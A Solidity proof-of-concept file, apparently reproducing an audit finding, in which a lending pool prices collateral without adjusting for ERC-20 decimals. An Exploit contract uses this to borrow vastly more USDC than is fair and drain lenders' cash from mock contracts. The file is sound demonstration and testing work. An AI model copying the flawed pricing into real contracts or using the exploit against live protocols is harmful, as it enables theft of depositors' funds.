// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

/*  Folks Finance x-chain — price ignores ERC-20 decimals
    (OtterSec / Robert Chen, AuditVault 47332).
    SYNTHETIC, cheatcode-free. The report: 1 DAI (18 decimals) against
    USDC (6 decimals), collateral factor 40%. The fair borrow is 0.4 USDC.
    Raw units price 1 DAI as 1e18 and 4e11 USDC as 4e17, so the loan
    draws 4e11 USDC (4e17 atomic) out of the lenders' cash. */

contract Token {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public immutable minter;
    uint8 public immutable decimals;

    constructor(uint8 decimals_) {
        minter = msg.sender;
        decimals = decimals_;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external {
        allowance[msg.sender][spender] = amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }

    function transferFrom(address from, address to, uint256 amount) external {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract Pool {
    uint256 public constant PRICE = 1;
    address public dai;
    address public usdc;
    mapping(address => uint8) public decimalsOf;
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public lenderCash;

    constructor(address dai_, address usdc_) {
        dai = dai_;
        usdc = usdc_;
        decimalsOf[dai_] = 18;
        decimalsOf[usdc_] = 6;
    }

    function creditLenders(address lender, uint256 amount) external {
        lenderCash[lender] += amount;
    }

    function depositCollateral(uint256 amount) external {
        Token(dai).transferFrom(msg.sender, address(this), amount);
        collateral[msg.sender] += amount;
    }

    function valueOf(address, uint256 amount) public pure returns (uint256) {
        // @> VULN: amount is not divided by 10**decimals.
        return amount * PRICE;
    }

    function borrowCapacity(address user) public view returns (uint256) {
        return valueOf(dai, collateral[user]) * 40 / 100;
    }

    function borrow(uint256 amount) external {
        require(amount <= borrowCapacity(msg.sender), "cap");
        require(amount <= Token(usdc).balanceOf(address(this)), "cash");
        Token(usdc).transfer(msg.sender, amount);
    }

    function fairCapacity(address user) public view returns (uint256) {
        uint256 col = collateral[user] * 1e18 / (10 ** decimalsOf[dai]);
        uint256 capValue = col * 40 / 100;
        return capValue * (10 ** decimalsOf[usdc]) / 1e18;
    }
}

contract Exploit {
    address public constant LENDER = address(0xB0B);

    Token public dai;
    Token public usdc;
    Pool public pool;
    uint256 public borrowed;
    uint256 public fair;
    uint256 public cashLeft;

    constructor() {
        dai = new Token(18);
        usdc = new Token(6);
        pool = new Pool(address(dai), address(usdc));
        dai.mint(address(this), 1e18);
        usdc.mint(address(pool), 4e17);
        pool.creditLenders(LENDER, 4e17);
        dai.approve(address(pool), 1e18);
    }

    function run() external {
        require(usdc.balanceOf(address(pool)) == 4e17, "lenders deposited 4e11 USDC");
        pool.depositCollateral(1e18);
        uint256 cap = pool.borrowCapacity(address(this));
        require(cap == 4e17, "buggy cap");
        fair = pool.fairCapacity(address(this));
        require(fair == 4e5, "fair cap is 0.4 USDC");
        pool.borrow(cap);
        borrowed = usdc.balanceOf(address(this));
        cashLeft = usdc.balanceOf(address(pool));
        require(borrowed == 4e17, "borrowed 4e11 USDC");
        require(cashLeft == 0, "lender cash gone");
        require(borrowed > fair, "no excess");
    }
}
